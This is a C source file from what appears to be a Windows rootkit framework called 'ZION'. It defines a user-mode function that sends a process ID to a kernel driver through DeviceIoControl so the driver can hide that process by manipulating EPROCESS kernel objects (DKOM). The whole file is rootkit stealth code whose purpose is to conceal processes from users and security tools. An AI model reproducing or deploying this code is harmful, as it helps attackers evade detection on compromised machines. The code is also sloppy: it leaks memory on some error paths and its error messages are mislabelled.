/*
 *      name: ZION system DKOM Eprocess User
 *      Org Author: Liang Chen
 *      Version : 0.2
 */
#include "zion_dkom_eprocess.h"


STD_EXPORT(ZIONRESULT) DKOM_HideProcessByPid(DWORD pid)
{
	PZION_CS_PACKET ptrZION_EPROCESS_Packet;
	PZION_DKOM_EPROCESS_CMD_DATA ptrDKOMEPROCESSCMDData;
	ptrZION_EPROCESS_Packet = (PZION_CS_PACKET)malloc(sizeof(ZION_CS_PACKET));
	if (NULL == ptrZION_EPROCESS_Packet)
	{
		printf("ZION: Memory alloc failed in DKOM_HideProcessByPid\n");
		return ZION_MEMORY_ALLOC_FAIL;
	}
	ptrDKOMEPROCESSCMDData = (PZION_DKOM_EPROCESS_CMD_DATA)malloc(sizeof(ZION_DKOM_EPROCESS_CMD_DATA));
	if (NULL == ptrDKOMEPROCESSCMDData)
	{
		printf("ZION: Memory alloc failed in DKOM_HideProcessByPid\n");
		return ZION_MEMORY_ALLOC_FAIL;
	}
	if (ZION_OK != ZION_SetDKOMEPROCESSCMDData(ptrDKOMEPROCESSCMDData,
		(DWORD)(pid)))
	{
		printf("ZION: Error in SSDT_HOOK\n");
		return ZION_ERROR;
	}
	if (ZION_OK != ZION_SetPacketValue(ptrZION_EPROCESS_Packet,
		CMD_DKOM_EPROCESS,
		ptrDKOMEPROCESSCMDData,
		sizeof(ZION_DKOM_EPROCESS_CMD_DATA)))
	{
		printf("ZION: Error in SSDT_HOOK\n");
		return ZION_ERROR;
	}

	DWORD dwReceived;
	//Maybe need to judge whether g_hZionServer_Dev is NULL
	if (!DeviceIoControl(g_hZionServer_Dev,
		IOCTL_ZION_CS_PKT_CMD,
		(LPVOID) ptrZION_EPROCESS_Packet,
		sizeof(ZION_CS_PACKET),
		NULL,
		0,
		&dwReceived,
		NULL))
	{
		printf("ZION: Device IO CTRL Error in SSDT_HOOK\n");
		free(ptrZION_EPROCESS_Packet);
		free(ptrDKOMEPROCESSCMDData);
		return ZION_ERROR;
	}
	printf("ZION: DKOM HIDE %d Succeed\n", pid);
	free(ptrZION_EPROCESS_Packet);
	free(ptrDKOMEPROCESSCMDData);
	return ZION_OK;
	//ZION_SetPacketValue(ptrZION_SSDT_Packet, CMD_SSDT_HOOK, 
}
ZIONRESULT ZION_SetDKOMEPROCESSCMDData(PZION_DKOM_EPROCESS_CMD_DATA data,
							   DWORD pid)
{
	data->pid = pid;
	return ZION_OK;
}